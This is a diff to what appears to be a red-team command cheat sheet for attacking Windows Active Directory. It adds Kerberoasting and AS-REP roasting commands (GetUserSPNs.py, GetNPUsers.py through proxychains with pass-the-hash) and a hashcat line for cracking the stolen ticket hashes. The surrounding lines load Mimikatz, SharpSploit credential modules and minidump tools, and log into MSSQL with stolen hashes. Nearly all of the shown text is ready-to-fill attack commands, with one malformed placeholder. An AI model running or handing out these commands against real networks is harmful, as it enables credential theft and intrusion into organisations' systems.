@@ -537,6 +537,7 @@ dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mi
 invoke_file /tmp/Invoke-Mimikatz.ps1
 Invoke-Mimikatz
 invoke_binary Invoke-Mimikittenz.exe
+proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP) <DOMAIN/USER>
 
 # minidumps
 invoke_file /tmp/Out-Minidump.ps1
@@ -709,6 +710,11 @@ foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.co
 # database access
 proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
 proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>
+
+# kerberoasting, crack spns
+proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
+proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
+hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
 ```
 
 ###### EXPLOITS
